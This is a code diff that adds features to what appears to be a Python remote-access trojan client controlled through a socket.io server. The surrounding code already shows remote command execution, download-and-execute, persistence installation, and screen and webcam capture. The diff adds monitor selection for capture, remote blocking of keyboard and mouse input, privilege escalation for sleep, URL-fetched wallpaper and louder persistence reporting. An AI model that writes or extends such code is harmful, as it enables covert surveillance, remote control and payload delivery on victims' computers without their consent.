@@ -77,6 +77,7 @@ class CapEngine:
     def __init__(self, sio, source="screen"):
         self.r = False; self.sio = sio; self.src = source  # "screen" or "webcam"
         self.q = 50; self.sc = 0.5; self.fps = 15; self.cap = None
+        self.monitor_idx = 1  # mss monitor index (1=primary, 2=secondary, etc.)
 
     def start(self):
         if self.r: return
@@ -95,7 +96,7 @@ class CapEngine:
     def _loop(self):
         try:
             if self.src == "screen":
-                self.cap = mss.mss(); mon = self.cap.monitors[1]
+                self.cap = mss.mss(); mon = self.cap.monitors[self.monitor_idx if self.monitor_idx < len(self.cap.monitors) else 1]
             else:
                 self.cap = cv2.VideoCapture(0)
                 self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
@@ -279,25 +280,52 @@ def _monoff():
     except: return False
 def _lock():
     try:
-        if sys.platform == "win32" and hasattr(ctypes, "windll"): ctypes.windll.user32.LockWorkStation()
-        elif sys.platform == "darwin": subprocess.run(["/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession","-suspend"], capture_output=True, timeout=5)
+        if sys.platform == "win32" and hasattr(ctypes, "windll"):
+            r = ctypes.windll.user32.LockWorkStation()
+            return True if r else False
+        elif sys.platform == "darwin":
+            subprocess.run(["/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession","-suspend"], capture_output=True, timeout=5)
+            return True
         else:
             for c in [["loginctl","lock-session"],["gnome-screensaver-command","-l"],["xdg-screensaver","lock"]]:
-                try: subprocess.run(c, capture_output=True, timeout=5); break
+                try: subprocess.run(c, capture_output=True, timeout=5); return True
                 except FileNotFoundError: continue
-        return True
-    except: return False
+            return False
+    except Exception as e: log.error(f"Lock err: {e}"); return False
 def _sleep():
     try:
-        if sys.platform == "win32" and hasattr(ctypes, "windll"): ctypes.windll.powrprof.SetSuspendState(0,1,0)
-        elif sys.platform == "darwin": subprocess.run(["pmset","sleepnow"], capture_output=True, timeout=5)
-        else: subprocess.run(["systemctl","suspend"], capture_output=True, timeout=5)
-        return True
-    except: return False
+        if sys.platform == "win32" and hasattr(ctypes, "windll"):
+            # Try with shutdown privilege first
+            try:
+                import win32security, win32api, pywintypes, win32con
+                token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
+                priv = win32security.LookupPrivilegeValue(None, win32security.SE_SHUTDOWN_NAME)
+                win32security.AdjustTokenPrivileges(token, False, [(priv, win32security.SE_PRIVILEGE_ENABLED)])
+            except:
+                pass  # pywin32 not installed, try direct call anyway
+            ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
+            return True
+        elif sys.platform == "darwin":
+            subprocess.run(["pmset","sleepnow"], capture_output=True, timeout=5)
+            return True
+        else:
+            subprocess.run(["systemctl","suspend"], capture_output=True, timeout=5)
+            return True
+    except Exception as e: log.error(f"Sleep err: {e}"); return False
 
 # ── NEW: Fun Commands ────────────────────────────────────────────────
 def _wallpaper(path):
-    """Change desktop wallpaper (Windows)."""
+    """Change desktop wallpaper from local path or URL."""
+    # If it's a URL, download it first
+    is_url = path.startswith("http://") or path.startswith("https://")
+    if is_url:
+        try:
+            import urllib.request, tempfile
+            fd, tmp = tempfile.mkstemp(suffix=".jpg", prefix="wp_")
+            os.close(fd)
+            urllib.request.urlretrieve(path, tmp)
+            path = tmp
+        except Exception as e: return False, f"Download failed: {e}"
     if not os.path.exists(path): return False, "File not found"
     try:
         if sys.platform == "win32":
@@ -308,7 +336,6 @@ def _wallpaper(path):
             subprocess.run(["osascript", "-e", script], capture_output=True)
             return True, "Wallpaper changed"
         else:
-            # Linux: try various DEs
             for cmd in [
                 ["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"],
                 ["feh", "--bg-scale", path],
@@ -419,6 +446,15 @@ def _execute_command(cmd):
     except subprocess.TimeoutExpired: return "TIMEOUT", -1
     except Exception as e: return str(e), -1
 
+def _block_input(block=True):
+    """Block/unblock mouse and keyboard input (Windows only, requires admin)."""
+    if sys.platform != "win32": return False, "Windows only"
+    try:
+        ok = ctypes.windll.user32.BlockInput(block)
+        if ok: return True, "Input blocked" if block else "Input unblocked"
+        return False, "Block failed (needs admin)" if block else "Unblock failed"
+    except Exception as e: return False, str(e)
+
 def _download_exec(url, save_path=None):
     """Download a file from URL and optionally execute it."""
     try:
@@ -506,7 +542,7 @@ def install_persist(url, secret, rec, cid):
     if ep != dest:
         try: shutil.copy2(ep, dest); log.info(f"Copied: {dest}")
         except Exception as e: log.warning(f"Copy fail: {e}"); dest = ep
-    ca = [dest, "--server", url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON)]
+    ca = [dest, "--server", url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON), "--no-persist"]
     if cid: ca += ["--id", cid]
     cl = subprocess.list2cmdline(ca)
     ok = False
@@ -605,16 +641,29 @@ def setup_handlers(sio):
                     "audio": HAS["pycaw"], "monitor": HAS["psutil"], "terminal": True, "webcam": HAS["cv2"]}}})
 
     @sio.on("disconnect")
-    def _d(): log.info("Disconnected"); state.conn = False; state.reg = False; sc.stop(); wc.stop(); mon.stop(); term.stop()
+    def _d():
+        _block_input(False)  # auto-unblock on disconnect
+        log.info("Disconnected"); state.conn = False; state.reg = False; sc.stop(); wc.stop(); mon.stop(); term.stop()
 
     @sio.on("registration_ok")
     def _r(d): state.reg = True; state.cid = d.get("client_id", state.cid); log.info(f"Registered: {state.cid}")
 
     # Screen
     @sio.on("start_screen_capture")
-    def _sc(d=None): sc.start(); sio.emit("screen_capture_status", {"active": True})
+    def _sc(d=None):
+        if d and "monitor" in d: sc.monitor_idx = int(d.get("monitor", 1))
+        sc.start(); sio.emit("screen_capture_status", {"active": True})
     @sio.on("stop_screen_capture")
     def _sc2(): sc.stop(); sio.emit("screen_capture_status", {"active": False})
+    @sio.on("set_screen_monitor")
+    def _smn(d):
+        if d and "monitor" in d:
+            sc.monitor_idx = int(d["monitor"])
+            was_running = sc.r
+            if was_running:
+                sc.stop()
+                sc.start()
+                sio.emit("screen_capture_status", {"active": True})
     @sio.on("set_screen_quality")
     def _sq(d):
         if d:
@@ -754,6 +803,10 @@ def setup_handlers(sio):
     def _ec(d): out, rc = _execute_command((d or {}).get("command","")); sio.emit("execute_result", {"output": out, "code": rc})
     @sio.on("download_exec")
     def _de(d): ok, msg = _download_exec((d or {}).get("url",""), (d or {}).get("path")); sio.emit("cmd_result", {"cmd": "download_exec", "ok": ok, "message": msg})
+    @sio.on("input_block")
+    def _ib(d=None): ok, msg = _block_input(True); sio.emit("cmd_result", {"cmd": "input_block", "ok": ok, "message": msg})
+    @sio.on("input_unblock")
+    def _iub(d=None): ok, msg = _block_input(False); sio.emit("cmd_result", {"cmd": "input_unblock", "ok": ok, "message": msg})
 
     # File ops
     @sio.on("file_list")
@@ -805,8 +858,10 @@ def main():
     if not args.no_persist and not args.uninstall:
         try:
             if url and secret:
-                install_persist(url, secret, rec, cid)
-        except Exception as e: log.debug(f"Auto-persist: {e}")
+                ok = install_persist(url, secret, rec, cid)
+                if ok: print("[+] Persistence refreshed")
+                else: print("[!] Persistence may have partially failed (run as admin for Scheduled Task)")
+        except Exception as e: print(f"[!] Auto-persist error: {e}")
 
     if not url: print("ERROR: Set _SERVER in code or use --server"); sys.exit(1)
     if not secret: print("ERROR: Set _SECRET in code or use --secret"); sys.exit(1)
